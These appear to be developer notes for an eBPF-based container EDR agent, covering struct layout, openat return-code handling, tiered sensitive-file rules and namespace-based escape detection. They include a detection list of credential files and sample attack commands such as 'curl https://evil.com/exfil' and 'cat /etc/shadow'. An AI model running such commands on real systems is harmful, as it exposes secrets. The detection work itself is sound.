## Key Technical Notes

### TASK_COMM_LEN: 16 → 128
Changed `#define TASK_COMM_LEN 16` to `128` in all `.h` files to capture full executable paths.
Must match Go struct field size exactly — `Comm [128]byte`.

---

### mnt_ns_id — use __u32 not __u64
Kernel's `ns.inum` is `unsigned int` (32-bit). Use `__u32 mnt_ns_id` in C struct and `uint32` in Go.
`BPF_CORE_READ(task, nsproxy, mnt_ns, ns.inum)` — requires kernel 5.8+ BTF (6.1 confirmed working).

---

### Container name resolution
Docker sets `HOSTNAME` env var to container ID (short hash), NOT container name.
Reliable approach: `docker ps --no-trunc` → build full container ID → name map.
Then `/proc/<pid>/cgroup` → extract container ID → look up name.

Debian 12 / kernel 6.1 uses **cgroupv2** — path format is:
`0::/system.slice/docker-<64char-id>.scope` (not `/docker/<id>`)
Fixed `containerIDFromCgroup` to handle both cgroupv1 and cgroupv2 formats.

**Validated** — alert shows `container=order-processor-auth_service`, host processes silently skipped.

---

### ExitEvent struct alignment bug (fixed)
Original C struct had implicit 4-byte padding before `duration_ns`:
```
int pid (4) + int ppid (4) + unsigned exit_code (4) + [4 implicit pad] + unsigned long long duration_ns (8) + comm (128) = 152 bytes
```
Go struct had wrong field order (DurationNs first) → all fields read as garbage.

Fix: reordered `exitsnoop.h` — `duration_ns` first, explicit `unsigned int pad`:
```
duration_ns (8) + pid (4) + ppid (4) + exit_code (4) + pad (4) + comm (128) = 152 bytes, no implicit padding
```
Go `ExitEvent` updated to match exactly.

**Rule**: always put the largest field first to avoid implicit padding. Explicit pad fields replace tail padding so C sizeof == Go binary.Size.

---

### Why `unsigned long long` for duration_ns
`bpf_ktime_get_ns()` returns u64 (nanoseconds). An `unsigned int` (u32) overflows at ~4.29 seconds.
We saw python3 at 12,595ms in real output — that is 3× over the u32 limit. Must stay u64.

---

### Perf Buffer vs Ring Buffer
`execsnoop.bpf.c` uses `BPF_MAP_TYPE_PERF_EVENT_ARRAY` (perf buffer, older pattern).
All new programs (`exitsnoop`, `opensnoop`, `lsm-connect`) use `BPF_MAP_TYPE_RINGBUF` (modern — lower overhead, no per-CPU waste).

---

### Garbled comm/filename — cstring() fix
**Problem**: `bytes.TrimRight(b, "\x00")` scans from the RIGHT and stops at the first non-null byte.
`bpf_ringbuf_reserve` does NOT zero-initialize memory. `bpf_probe_read_user_str` writes up to the null terminator but leaves the rest of the buffer as garbage from previous ring buffer usage.
Result: comm and filename printed with garbage after the real string.

**Fix**: `cstring(b []byte)` uses `bytes.IndexByte(b, 0)` — finds the FIRST null byte and slices there. This is correct C-string semantics.

`bpf_get_current_comm` uses `strncpy` which DOES zero-pad, so comm was technically safe with TrimRight. But `bpf_probe_read_user_str` does NOT zero-pad. Both now use `cstring` for consistency.

---

### opensnoop: two-probe pattern (sys_enter + sys_exit)

**Why two probes?**
A single `sys_enter_openat` hook fires on every attempt — including when curl probes `~/.curlrc` which does not exist. This fires HIGH alerts for harmless config-file probing.

**Pattern**:
1. `sys_enter_openat` — read filename + process context, store in `pending_opens` hash map keyed by tid
2. `sys_exit_openat` — check return value, emit to ring buffer only if file was actually accessed, delete from map

**Return code logic** (critical — easy to get wrong):
- `ret >= 0` — valid fd, file opened successfully → emit
- `ret == -EACCES` — file EXISTS, OS blocked access (uid mismatch) → **emit** (attack attempt)
- `ret == -EPERM` — operation not permitted on existing file → **emit**
- `ret == -ENOENT` — file does not exist, just probing → **drop**
- other negative — benign errors → drop

**Mistake we made**: initially dropped ALL negative returns (`if ret < 0 → drop`).
This broke `cat /etc/shadow` detection: uid=1000 gets `-EACCES`, which was silently dropped.
Fix: `if ret < 0 && ret != -EACCES && ret != -EPERM → drop`

**Rule**: the access ATTEMPT against an existing sensitive file is the signal, whether the OS allowed it or not.

---

### File rule design — tiered severity

Learned through real output: not all sensitive files carry the same risk.

| Tier | Files | Severity | Reason |
|---|---|---|---|
| CRITICAL | `/root/.ssh/`, `/home/.ssh/` | CRITICAL | SSH keys → direct access |
| HIGH | `/etc/shadow`, `/run/secrets/`, `/proc/1/`, `.key`, `id_rsa`, `id_ed25519`, `.env` | HIGH | Credential theft, container escape |
| MEDIUM | `/etc/passwd`, `/etc/group` | MEDIUM | World-readable, but unexpected from app code |

**`.pem` removed** — too broad. Python `certifi` library loads `cacert.pem` (CA bundle) on every HTTPS request. Keeping `.pem` fires HIGH on every API call. Private keys are caught by `.key` and `id_*` names.
**TODO**: restore `.pem` with a path exception for `/site-packages/` and `/certifi/` before shipping.

---

### curl detection — why removed from process rules

**Original rule**: `curl_from_container` — alert when curl runs inside any non-whitelisted container.

**Problem**: fires on every Docker `HEALTHCHECK` (every Dockerfile has `curl -f http://localhost:PORT/health`), every integration test smoke test, and documentation examples. Fires on ALL containers, every 10–30 seconds.

**Root cause**: execsnoop sees the binary name, not the destination. Cannot distinguish:
- `curl http://localhost:8080/health` — health check, expected
- `curl https://evil.com/exfil` — attack

**Decision**: remove from process rules entirely. The correct detection is in `lsm-connect`, which hooks the network connection and can check destination IP/domain. `allowedMarketAPI = "api.coingecko.com"` constant is reserved for that enforcement.

**Lesson**: a rule that fires on every health check is worse than no rule — it trains operators to ignore alerts. Better to have a gap and fill it at the right layer.

---

### pid→container cache — fixes exit event unknowns

**Problem 1 — container=unknown**: Go tries to read `/proc/<pid>/ns/mnt` when an exit event arrives, but the process is already gone from `/proc`. Returns `unknown`.

**Problem 2 — wrong ppid**: `real_parent` in the kernel at exit time may have changed to init (PID 1) due to Linux reparenting — when a parent dies before its child, the child is reparented to init. So ppid in exit events was sometimes 0 or 1.

**Fix**: cache `pid → PidInfo{Container, Ppid}` when execsnoop fires (process starts). When exitsnoop fires, look up and evict from cache. Use cached values instead of re-reading `/proc`.

**Implementation**: `sync.Map` in `container.go` — safe for concurrent goroutine access. `LoadAndDelete` atomically retrieves and removes the entry.

**Limitation**: processes that started before the EDR agent launched have no cache entry — these still show `unknown`. This is expected and acceptable.

---

### Hybrid namespace strategy — host vs container vs escape

**Problem**: original design silently skipped ALL host processes in process rules.
If malware installs on the VM as uid=0, it appears as `container=host` and is never alerted.

**Decision**: Option A (skip all host) is too risky. Option B (full host whitelist) is a rabbit hole.
Implemented a "hybrid" strategy using mount namespace ID as the boundary:

| Namespace | Label | Action |
|---|---|---|
| mnt_ns == PID 1 namespace | `host` | skip most rules |
| mnt_ns in Docker map | `order-processor-xxx` | full container rules |
| mnt_ns not found anywhere | `unknown-ns` | CRITICAL escape alert |

**`unknown-ns` detection**:
After a cache miss, `resolveContainer` immediately rescans `/proc` to handle new containers
that started within the 30s refresh window. If STILL not found → return `"unknown-ns"`.
A process in an unrecognized namespace after a fresh rescan has no legitimate explanation —
it's either a container escape or an unauthorized namespace creation.

**Host-specific file rule**:
Instead of whitelisting all host processes, one targeted rule:
`host process + /var/lib/docker/overlay2/ → CRITICAL host_reads_container_fs`
This catches an attacker on the host reading container filesystems directly (bypasses container
isolation). No host whitelist needed — dockerd itself doesn't read overlay2 files at runtime.

**errno defines in BPF**:
`errno.h` is not available in BPF programs. Must define constants manually:
```c
#define EPERM   1
#define ENOENT  2
#define EACCES  13
```
These are stable Linux ABI values (`uapi/asm-generic/errno-base.h`). Never use raw numbers
in conditions — always define named constants for readability and maintainability.

---

### Known limitation: exit events for pre-EDR processes

Exit events use the pid cache (populated at exec time by execsnoop).
Processes that were already running when the EDR agent started have no cache entry.
Their exit events show `container=unknown` — not `unknown-ns`.

**Why `unknown` not `unknown-ns`**:
- `unknown-ns` comes from `resolveContainer()` — called when execsnoop fires
- `unknown` comes from the pid cache miss in the exit goroutine
- Exit events don't call `resolveContainer` — they rely on the cache only

**Real-world impact**:
- `bash` spawned by `run_all_tests.sh` or Docker health management (ppid=4018865, recurring)
  shows `container=unknown`, fires LOW `short_lived_failure`
- These are host scripts that predate EDR — not a real threat
- The important detections (cat /etc/shadow from auth_service) correctly show container name

**Proper fix (not implemented — out of scope)**:
Add `mnt_ns_id` to `exitsnoop.h` struct, read it in BPF, call `resolveContainer` as fallback
when pid cache misses. Requires exitsnoop BPF struct change + Go ExitEvent update.

---

## Rule Philosophy (learned from trial and error)

1. **Never remove a rule just to reduce noise** — that creates a blind spot. Tune it instead.
2. **BPF = wide net** — collect all relevant events with minimal kernel-side filtering.
3. **Go = smart rules** — all detection logic in userspace where context is available.
4. **False positives → make rules smarter, not smaller** — add comm/path context, not delete.
5. **Detection at the right layer** — process-level rules catch binary names; network-level (lsm-connect) catches destinations. Don't mix them.

## To Do

- [ ] Restore `.pem` with path exception for `/site-packages/` and `/certifi/`
- [ ] Rewrite `lsm-connect.bpf.c` with ring buffer + Go integration
- [ ] Wire lsm-connect into `main.go`
- [ ] Implement curl destination check in lsm-connect: only `inventory_service` → `api.coingecko.com`
- [ ] Go unit tests — `rules_test.go`, `container_test.go`
- [ ] Final validation — all rules trigger + integration tests pass simultaneously
